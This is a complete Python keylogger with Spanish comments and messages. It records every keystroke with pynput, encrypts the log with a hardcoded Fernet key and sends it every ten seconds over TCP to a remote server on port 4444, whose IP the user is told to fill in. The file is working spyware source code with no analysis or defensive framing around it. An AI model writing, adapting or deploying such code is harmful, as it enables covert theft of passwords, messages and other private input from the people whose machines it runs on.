import socket
import time
import threading
from cryptography.fernet import Fernet
from pynput import keyboard


class Encryptor:
    def __init__(self, key):
        self.cipher = Fernet(key)

    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())


class Client:
    def __init__(self, server_ip, server_port, encryptor_instance):
        self.server_ip = server_ip
        self.server_port = server_port
        self.encryptor_instance = encryptor_instance

    def send_data(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                print(f"[INFO] Conectando al servidor {self.server_ip}:{self.server_port}")
                client_socket.connect((self.server_ip, self.server_port))
                encrypted_data = self.encryptor_instance.encrypt(data)
                client_socket.sendall(encrypted_data)
                print("[INFO] Datos enviados.")
        except Exception as e:
            print(f"[ERROR] No se pudo conectar al servidor: {e}")
            time.sleep(5)


class KeyLogger:
    def __init__(self, client_instance):
        self.client_instance = client_instance
        self.log = ""
        self.running = True

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
            else:
                if key == keyboard.Key.space:
                    self.log += " "
                elif key == keyboard.Key.enter:
                    self.log += "\n"
                elif key == keyboard.Key.tab:
                    self.log += "\t"
                elif key == keyboard.Key.backspace:
                    self.log += "[BACKSPACE]"
                elif key == keyboard.Key.esc:
                    print("[INFO] Tecla ESC presionada, terminando.")
                    self.running = False
                else:
                    self.log += f"[{key.name}]"
        except AttributeError:
            pass

    def send_logs(self):
        while self.running:
            if self.log:
                print(f"[INFO] Enviando logs: {self.log}")
                self.client_instance.send_data(self.log)
                self.log = ""
            else:
                print("[INFO] No hay logs para enviar.")
            time.sleep(10)

    def start(self):

        try:
            listener = keyboard.Listener(on_press=self.on_press)
            sender_thread = threading.Thread(target=self.send_logs, daemon=True)
            sender_thread.start()
            with listener:
                listener.join()
        except Exception as e:
            print(f"[ERROR] Ocurrió un error con el listener: {e}")


SERVER_IP = ""  #aqui se ingresa la ip de la maquina usada como servidor
SERVER_PORT = 4444

KEY = b'y8N2f_PGbyUXdfkmYp0x3eAaKAtMXE8IYljxqN9TTfI='

encryptor = Encryptor(KEY)
client = Client(SERVER_IP, SERVER_PORT, encryptor)
keylogger = KeyLogger(client)

if __name__ == "__main__":
    keylogger.start()
